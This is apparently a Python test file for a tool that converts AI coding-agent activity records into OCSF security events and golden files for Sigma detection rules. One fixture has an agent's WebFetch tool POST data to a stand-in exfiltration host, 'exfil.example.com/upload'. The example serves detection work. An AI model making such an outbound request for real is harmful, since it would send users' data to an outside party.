"""Generate golden files for missing OCSF classes needed by Sigma rules."""

from stationchief.core.mapping import map_record
from stationchief.core.records import Action, ActionKind, ActivityRecord, Actor, Decision

ACTOR = Actor(
    user_name="dev",
    agent_name="claude-code",
    agent_version="2.0.1",
    model="claude-opus-5",
    model_provider="Anthropic",
    pid=4242,
)


def record(action):
    return ActivityRecord(
        source="mapping",
        session_id="sess-abc",
        turn_id="turn-1",
        ts=1758326400000,
        event="ActionRecorded",
        actor=ACTOR,
        cwd="/repo",
        hostname="laptop",
        posture={"permission_mode": "default"},
        prompt=None,
        action=action,
        decision=Decision.OBSERVED,
    )


def test_http_activity_post(assert_golden):
    """Generate golden for HTTP POST activity (class 4002)."""
    event = map_record(
        record(
            Action(
                tool="WebFetch",
                kind=ActionKind.HTTP,
                input={"url": "https://exfil.example.com/upload?x=1", "method": "POST"},
            )
        )
    )
    assert event["class_uid"] == 4002
    assert_golden("mapping", "http_activity_post", event)


def test_application_lifecycle_mcp(assert_golden):
    """Generate golden for MCP server load (class 6002)."""
    event = map_record(
        record(
            Action(
                tool="mcp_server_load",
                kind=ActionKind.COMPONENT_LOAD,
                input={
                    "name": "github",
                    "kind": "mcp_server",
                    "scope": "user",
                    "command": "npx -y @acme/github-mcp",
                },
            )
        )
    )
    assert event["class_uid"] == 6002
    assert_golden("mapping", "application_lifecycle_mcp", event)
